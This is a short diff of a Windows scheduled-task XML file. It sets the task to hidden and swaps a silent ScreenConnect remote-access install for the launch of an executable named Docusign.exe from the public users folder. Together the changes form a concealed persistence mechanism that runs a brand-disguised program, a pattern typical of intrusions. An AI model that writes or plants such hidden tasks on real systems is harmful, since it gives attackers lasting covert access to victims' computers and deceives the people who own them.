@@ -37,7 +37,7 @@
     </IdleSettings>
     <AllowStartOnDemand>true</AllowStartOnDemand>
     <Enabled>true</Enabled>
-    <Hidden>false</Hidden>
+    <Hidden>true</Hidden>
     <RunOnlyIfIdle>false</RunOnlyIfIdle>
     <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
     <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
@@ -47,8 +47,8 @@
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>msiexec.exe</Command>
-      <Arguments>/i "C:\Users\Public\ScreenConnect.ClientSetup.msi" /quiet</Arguments>
+      <Command>C:\Users\Public\Docusign.exe</Command>
+      <Arguments></Arguments>
     </Exec>
   </Actions>
 </Task>
